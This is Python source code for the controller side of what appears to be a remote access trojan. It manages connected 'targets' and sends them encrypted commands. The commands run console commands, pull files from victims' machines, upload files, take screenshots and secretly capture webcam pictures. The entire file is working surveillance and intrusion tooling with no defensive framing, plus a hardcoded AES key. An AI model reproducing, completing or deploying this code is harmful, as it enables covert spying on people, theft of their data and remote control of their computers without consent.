# standard python libraries
import sys
import base64
import socket
import json
import threading
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
# non-standard libraries
import texttable


class Server:
    def __init__(self):
        self.timeout = 30
        self.zip_compression_level = 0
        self.camera_port = 0
        self.percentage_dec_places = 1
        self.connection = Connection()

    def main(self):
        while True:
            entered = input("[+] ")
            if entered:
                command = entered[0].lower()
                attribute = entered[2:].split(" @ ")

                if command == "h":
                    self.print_help()
                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["timeout", "zip_compression", "camera_port", "percentage_dec_places"]:
                    self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
                elif command == "l" and len(attribute):
                    self.list_sessions(self.get_conn_fgoi(attribute[0].split()))
                elif command == "t" and len(attribute) == 2:
                    self.edit_tag(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                elif command == "r" and len(attribute):
                    self.close_session(self.get_conn_fgoi(attribute[0].split()))
                elif command == "g" and len(attribute) == 2 and attribute[0].split()[0].lower() in ["add", "rm"]:
                    self.edit_group(attribute[0].split()[0].lower(), self.get_conn_fgoi(attribute[0].split()[0:]), attribute[1].split())
                elif command == "f" and len(attribute) == 2 and attribute[0].split()[0] in ["set", "get"]:
                    if attribute[0].split()[0] == "set":
                        if len(attribute[0].split()) == 2:
                            self.cwd(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[1].split()))
                        else:
                            print("[-] InvalidInputError")
                    elif attribute[0].split()[0] == "get":
                        if len(attribute[0].split()) == 1:
                            self.cwd(attribute[0].split()[0], "", self.get_conn_fgoi(attribute[1].split()))
                        else:
                            print("[-] InvalidInputError")
                elif command == "c" and len(attribute) == 2:
                    self.execute_command(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                elif command == "d" and len(attribute) == 3:
                    self.download_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "u" and len(attribute) == 3:
                    self.upload_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "s" and len(attribute) == 2 and len(attribute[0].split()) == 2:
                    self.make_screenshot(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[1].split()))
                elif command == "z" and len(attribute) == 3:
                    self.zip_file_or_folder(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "w" and len(attribute) == 2:
                    self.capture_camera_picture(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                elif command == "x":
                    self.exit_server()
                    break
                else:
                    print("[-] InvalidInputError")
            else:
                print("[-] InvalidInputError")

    def print_help(self):
        print("h show this page")
        print("o [timeout/zip_compression/camera_port] [value] set option")
        print("l [clients] list clients")
        print("t [tag] @ [clients] change tag")
        print("r [clients] close and remove connection")
        print("g [add/rm] [clients] @ [group name] change group")
        print("f [set/get] [path] @ [clients] set or get current working directory")
        print("c [command] @ [clients]  execute console command")
        print("d [path to open] @ [path to save] @ [clients] download file from target")
        print("u [path to open] @ [path to save] @ [clients] upload file to target")
        print("s [monitor] [path_to_save] @ [clients] capture screenshot")
        print("z [path_to_open] @ [path_to_save] @ [clients] zip file or folder")
        print("w [path_to_save] @ [clients] capture camera picture")
        print("x exit server")

    def exit_server(self):
        self.connection.sock.close()

    def list_sessions(self, connections):
        table = texttable.Texttable()
        table.set_cols_width([5, 15, 6, 15, 15])
        rows = [["INDEX", "ADDRESS", "PORT", "TAG", "GROUPS"]]
        for index, session in enumerate(self.connection.sessions):
            if session["connection"] in connections:
                rows.append([index, session["address"], session["port"], session["tag"], ", ".join(session["groups"])])
        table.add_rows(rows)
        print(table.draw())

    def set_option(self, option, value):
        option = option.lower()
        if option == "timeout":
            try:
                self.timeout = int(value)
            except ValueError:
                print("[-] InvalidTimeout")
        elif option == "zip_compression":
            try:
                if int(value) not in range(10):
                    print("[-] InvalidCompressionLevel")
                else:
                    self.zip_compression_level = int(value)
            except ValueError:
                print("[-] InvalidCompressionLevel")
        elif option == "camera_port":
            try:
                if not int(value) < 0:
                    print("[-] InvalidCameraPort")
                else:
                    self.camera_port = int(value)
            except ValueError:
                print("[-] InvalidCameraPort")

    def edit_tag(self, tag, connections):
        for index, session in enumerate(self.connection.sessions):
            if session["connection"] in connections:
                self.connection.sessions[index]["tag"] = tag

    def close_session(self, connections):
        request = {"cmd": "r",
                   "timeout": self.timeout}
        for session in list(self.connection.sessions):
            if session["connection"] in connections:
                try:
                    self.connection.send(request, session["connection"])
                except socket.error:
                    pass
                session["connection"].close()
                self.connection.sessions.remove(session)

    def edit_group(self, mode, connections, group_names):
        if mode == "add":
            for index, session in enumerate(self.connection.sessions):
                if session["connection"] in connections:
                    for name in group_names:
                        if name not in self.connection.sessions[index]["groups"]:
                            self.connection.sessions[index]["groups"].append(name)
                        else:
                            print("[-] TargetAlreadyInGroup")

        elif mode == "rm":
            for index, session in enumerate(self.connection.sessions):
                if session["connection"] in connections:
                    for name in group_names:
                        try:
                            self.connection.sessions[index]["groups"].remove(name)
                        except ValueError:
                            print("[-] TargetNotInGroup")

    def cwd(self, mode, path, connections):
        request = {"cmd": "f",
                   "mode": mode,
                   "path": path,
                   "timeout": self.timeout}
        for connection in connections:
            self.connection.send(request, connection)
            response = self.connection.recv(connection)

            if response["data"]:
                print(response["data"])
            if response["error"]:
                print(f"[-] {response['error']}")

    def execute_command(self, exe, connections):
        request = {"cmd": "c",
                   "exe": exe,
                   "timeout": self.timeout}
        for connection in connections:
            self.connection.send(request, connection)
            response = self.connection.recv(connection)

            if response["data"]:
                print(response["data"])
            if response["error"]:
                print(f"[-] {response['error']}")

    def download_file(self, path_to_open, path_to_save, connections):
        request = {"cmd": "d",
                   "open_path": path_to_open}
        for connection in connections:
            self.connection.send(request, connection)
            response = self.connection.recv(connection)
            if response["error"]:
                print(f"[-] {response['error']}")
            else:
                try:
                    with open(path_to_save, "wb") as file:
                        file.write(base64.b64decode(response['data']))
                except PermissionError:
                    print("[-] PermissionError")

    def upload_file(self, path_to_open, path_to_save, connections):
        request = {"cmd": "u",
                   "save_path": path_to_save,
                   "data": str()}
        try:
            with open(path_to_open, "rb") as file:
                request["data"] = base64.b64encode(file.read()).decode(self.connection.CODEC)
        except FileNotFoundError:
            print("[-] FileNotFoundError")
        except PermissionError:
            print("[-] PermissionError")
        else:
            for connection in connections:
                self.connection.send(request, connection)
                response = self.connection.recv(connection)
                if response["error"]:
                    print(f"[-] {response['error']}")

    def make_screenshot(self, monitor, path_to_save, connections):
        request = {"cmd": "s",
                   "monitor": monitor,
                   "save_path": path_to_save,
                   "timeout": self.timeout}
        for connection in connections:
            self.connection.send(request, connection)
            response = self.connection.recv(connection)

            if response["error"]:
                print(f"[-] {response['error']}")

    def zip_file_or_folder(self, path_to_open, path_to_save, connections):
        request = {"cmd": "z",
                   "comp_lvl": self.zip_compression_level,
                   "open_path": path_to_open,
                   "save_path": path_to_save,
                   "timeout": self.timeout}
        for connection in connections:
            self.connection.send(request, connection)
            response = self.connection.recv(connection)

            if response["error"]:
                print(f"[-] {response['error']}")

    def capture_camera_picture(self, path_to_save, connections):
        request = {"cmd": "w",
                   "cam_port": self.camera_port,
                   "save_path": path_to_save,
                   "timeout": self.timeout}
        for connection in connections:
            self.connection.send(request, connection)
            response = self.connection.recv(connection)

            if response["error"]:
                print(f"[-] {response['error']}")

    def get_conn_fgoi(self, objects):  # get connections from groups and/or indices
        connections = list()
        for goi in objects:
            for index, session in enumerate(self.connection.sessions):
                if session["connection"] not in connections:
                    if goi in session["groups"]:
                        connections.append(session["connection"])
                    elif goi == str(index):
                        connections.append(session["connection"])
        return connections


class Connection:
    def __init__(self):
        self.CODEC = "utf8"
        self.PACKET_SIZE = 1024
        self.END_MARKER = "-".encode(self.CODEC)
        self.sessions = list()

        HOST = "127.0.0.1"
        PORT = 10001
        KEY = b'\xbch`9\xd6k\xcbT\xed\xa5\xef_\x9d*\xda\xd2sER\xedA\xc0a\x1b)\xcc9\xb2\xe7\x91\xc2A'

        self.crypter = AESGCM(KEY)

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.sock.bind((HOST, PORT))
        print("[*] server running")
        self.accept_new_connections_process = threading.Thread(target=self.accept_new_connections, args=(self.sock,))
        self.accept_new_connections_process.start()
        print("[*] waiting for clients")

    def accept_new_connections(self, sock):
        while True:
            try:
                sock.listen()
                connection, (address, port) = sock.accept()
            except OSError:  # error occurs when socket is closed
                break
            else:
                session = {"connection": connection,
                           "address": address,
                           "port": port,
                           "tag": "no tag",
                           "groups": ["all"]}
                self.sessions.append(session)

    # credit: https://stackoverflow.com/questions/1094841/reusable-library-to-get-human-readable-version-of-file-size
    def format_byte_length(self, num, suffix='B'):
        for unit in ['', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi']:
            if abs(num) < 1024.0:
                return f"{num:3.1f} {unit}{suffix}"
            num /= 1024.0
        return f"{num:3.1f} Yi{suffix}"

    def send(self, data: dict, connection):
        data = bytearray(base64.b64encode(self.encrypt(json.dumps(data).encode(self.CODEC))) + self.END_MARKER)
        len_data_total = len(data)
        try:
            while data:
                connection.send(data[:self.PACKET_SIZE])
                del data[:self.PACKET_SIZE]
                len_data_current = len_data_total - len(data)
                sys.stdout.write(f"\r[*] sending... {round(len_data_current / (len_data_total / 100), 1)}% [{self.format_byte_length(len_data_current)} / {self.format_byte_length(len_data_total)}] complete")
                sys.stdout.flush()
        except socket.error as error:
            print(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
        print()

    def recv(self, connection) -> dict:
        header = bytearray()
        data = bytearray()
        try:
            while not header.endswith(self.END_MARKER):
                header.extend(connection.recv(self.PACKET_SIZE))
            header = json.loads(self.decrypt(base64.b64decode(header[:-1])).decode(self.CODEC))
            while not data.endswith(self.END_MARKER):
                data.extend(connection.recv(self.PACKET_SIZE))
                sys.stdout.write(f"\r[*] receiving... {round(len(data) / (header['length'] / 100), 1)}% [{self.format_byte_length(len(data))} / {self.format_byte_length(header['length'])}] complete")
                sys.stdout.flush()
        except socket.error as error:
            sys.stdout.write(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
            sys.stdout.flush()
        print()
        return json.loads(self.decrypt(base64.b64decode(data[:-1])).decode(self.CODEC))

    def encrypt(self, data):
        nonce = os.urandom(12)
        return nonce + self.crypter.encrypt(nonce, data, b"")

    def decrypt(self, cipher):
        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")

    def get_index_by_connection(self, searched_connection):
        for index, session in enumerate(self.sessions):
            if searched_connection == session["connection"]:
                return index


if __name__ == "__main__":
    server = Server()
    server.main()
